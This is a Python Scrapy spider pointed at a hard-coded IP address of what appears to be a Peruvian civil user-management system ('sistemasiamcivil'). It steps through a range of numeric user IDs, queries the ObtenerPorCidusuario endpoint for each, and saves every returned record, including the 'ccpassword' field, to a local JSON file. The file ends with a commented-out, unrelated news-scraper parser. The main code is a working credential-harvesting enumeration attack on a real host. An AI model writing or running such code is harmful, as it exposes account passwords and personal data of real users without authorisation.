#!/usr/bin/env python
# -*- coding: utf-8 -*-

import scrapy
import json
import re
from siamcraw.items import LoginItem
#from scrapy.contrib.loader import ItemLoader
import datetime, locale
locale.setlocale(locale.LC_TIME, 'es_PE.utf8')

class SiamSpider(scrapy.Spider):
    name = "siam"
    allowed_domains = ["http://181.65.129.39"]

    def __init__(self, ini=None, fin=None, *args, **kwargs):
        super(SiamSpider, self).__init__(*args, **kwargs)
        self.ini = ini
        self.fin = fin

    def start_requests(self):
        print '-------------------------------------'
        print self.ini,self.fin
        requests = []
        #43123568
        #43123591
        cont = int(self.ini)
        while cont <= int(self.fin):#10090000:
        #for cont in range(40000000,40000999):#73329821 #49999999
            request = scrapy.FormRequest('http://181.65.129.39/sistemasiamcivil/usuarios/ObtenerPorCidusuario', 
                formdata={'cidusuario': str(cont)}, 
                callback=self.parse_data,
                dont_filter=True)

            request.meta['cookiejar'] = cont
            requests.append(request)
            cont = cont + 1
        return requests
        #payload = {"cidusuario": 46857621}
        #yield Request(url="http://181.65.129.39/sistemasiamcivil/usuarios/ObtenerPorCidusuario", self.parse_data, method="POST", body=urllib.urlencode(payload))

    def parse_data(self, response):
        # do stuff with data...
        data = json.loads(response.body)

        
        if data['cidusuario'] != None:
            item = LoginItem()
            item['ccpassword'] = data['ccpassword']
            item['cdescribe'] = data['cdescribe']
            item['cidgrupo'] = data['cidgrupo']
            item['cidusuario'] = data['cidusuario']
            item['csuspendido'] = data['csuspendido']
            item['userid'] = data['userid']
            #yield item
            f = open("docs.json", "a")
            d = json.dumps(data)
            f.write(str(d) + ",\n")
            f.close()
        


    	#yield Request(my_url, meta={'cookiejar': response.meta['cookiejar']}, callback = my_callback)

'''
    def parse(self, response):
        sel = Selector(response)
        sites = sel.xpath('//div[contains(@class,"bloq_news")]')
        for site in sites:
            item = Link()
            item['name'] = site.xpath('div/div/hgroup/h2/a/text()').extract()[0]
            item['url'] = site.xpath('div/div/hgroup/h2/a/@href').extract()[0]
            #item['url'] = "http://diariocorreo.pe/" + item['url']
            yield scrapy.Request(url=item['url'], callback=self.get_new)

    def parse_date(self, value):
        ### Formato PERU21
        #Sábado 25 de abril del 2015 | 12:40 
        return datetime.datetime.strptime(value.encode('utf-8'),"%A %d de %B del %Y | %H:%M ").strftime("%d/%m/%Y")
    def get_new(self, response):
        sel = Selector(response)
        il = ItemLoader(item=New())
        il.add_value('tema', ['Marketing y Publicidad'])
        il.add_value('titulo', sel.xpath('//h1[@itemprop="headline"]/a/text()').extract())
        il.add_value('texto', sel.xpath('//div[@itemprop="articleBody"]').extract())
        il.add_value('fecha', sel.xpath('//div[@itemprop="datePublished"]/text()').extract())
        il.add_value('keywords', sel.xpath('//div[contains(@class,"nota-tags")]//h3/a/text()').extract())
        item = il.load_item()

        if 'titulo' in item:
            pass
        else:
            iln = ItemLoader(item=New())
            iln.add_value('tema', ['Marketing y Publicidad'])
            iln.add_value('titulo', sel.xpath('//h1/text()').extract())
            iln.add_value('texto', sel.xpath('//div[@id="principal"]/div[@class="nota"]/div[3]').extract())
            iln.add_value('fecha', sel.xpath('//div[@class="fecha-nota"]/text()').extract())
            iln.add_value('keywords', sel.xpath('//div[contains(@class,"nota-tags")]//h3/a/text()').extract())
            item = iln.load_item()

        if 'keywords' in item:
            pass
        else:
            item['keywords'] = ['Marketing y Publicidad']
        
        if 'fecha' in item:
            item['fecha'] = self.parse_date(item['fecha'])
        else:
            item['fecha'] = '10/05/2015'
        
        if 'titulo' in item:
            if 'texto' in item:
                yield item

'''